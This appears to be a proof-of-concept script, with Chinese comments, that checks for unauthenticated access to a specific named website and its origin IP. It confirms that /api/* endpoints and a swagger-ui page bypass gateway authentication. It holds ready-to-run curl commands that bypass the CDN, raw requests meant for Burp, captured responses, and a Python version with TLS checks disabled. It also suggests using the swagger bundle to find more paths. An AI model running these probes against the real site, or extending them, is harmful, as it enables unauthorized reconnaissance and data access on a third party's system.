# liqinaicj.cn /mmjd —— 网关鉴权白名单未覆盖业务 /api/* 的未授权只读验证
# 结论: /api/* 前缀整体放行, /mall/* 等业务前缀仍 401; swagger-ui 静态页亦在放行名单内
# 无 Cookie / Token / 账号; 源站 43.143.40.171 按 Host 头路由, 故用 --resolve 绑定 Host 与 SNI
# 依赖: curl (Windows 下 curl.exe 自带), 无需 python

DOMAIN=liqinaicj.cn
SRC=43.143.40.171
BASE="https://$DOMAIN/mmjd"
C="curl.exe -sS -k --noproxy * --tlsv1.2 --tlsmax 1.2 --max-time 10 --resolve $DOMAIN:443:$SRC"

# ---- 0. 阴性对照: 非白名单业务路径, 期望 code:401 "认证失败" ----
$C -H 'Accept: application/json' -w '\n[%{http_code}]\n' "$BASE/mall/food/list"

# ---- 1. 未授权只读接口（每条都应 200 + code:200 + data 非空）----
for p in api/getAdsList api/noticeList api/couponList api/newFoodList; do
  echo "=== $p"
  $C -H 'Accept: application/json' -w '\n[%{http_code}]\n' "$BASE/$p"
  sleep 1
done

# ---- 2. API 面: swagger-ui 静态壳（200 = 放行, 可据 bundle 继续扩路径）----
$C -o /dev/null -w '%{http_code} %{size_download}\n' "$BASE/swagger-ui/index.html"

# ---- 3. 原始请求形态（可直接贴进 Burp / 手搓）----
# GET /mmjd/api/getAdsList HTTP/1.1
# Host: liqinaicj.cn
# User-Agent: Mozilla/5.0 Chrome/124.0
# Accept: application/json
# --> HTTP 200, 1020B
# {"msg":"操作成功","code":200,"data":[{"title":...,"image":...,"createTime":"2022-10-08 23:45:58"}]}
#
# GET /mmjd/api/noticeList HTTP/1.1
# Host: liqinaicj.cn
# Accept: application/json
# --> HTTP 200, 722B, data 为公告全量记录
#
# GET /mmjd/mall/food/list HTTP/1.1        (对照)
# --> HTTP 200
# {"msg":"请求访问：/mmjd/mall/food/list，认证失败，无法访问系统资源","code":401}
#
# GET /mmjd/swagger-ui/index.html HTTP/1.1
# --> HTTP 200, 3129B, springfox 3.0.0 页面（引用 swagger-ui-bundle.js）
# 同目录 /v3/api-docs 为 401 —— 只放静态资源, 不放 spec

# ---- 4. python 版本（原验证即 requests verify=False + 固定 Host）----
# import requests
# H = {"Host":"liqinaicj.cn","Accept":"application/json","User-Agent":"Mozilla/5.0 Chrome/124.0"}
# for p in ["/mmjd/mall/food/list","/mmjd/api/getAdsList","/mmjd/api/noticeList",
#           "/mmjd/api/couponList","/mmjd/api/newFoodList"]:
#     r = requests.get("https://43.143.40.171"+p, headers=H, verify=False, timeout=10)
#     print(r.status_code, len(r.content), r.text[:200])
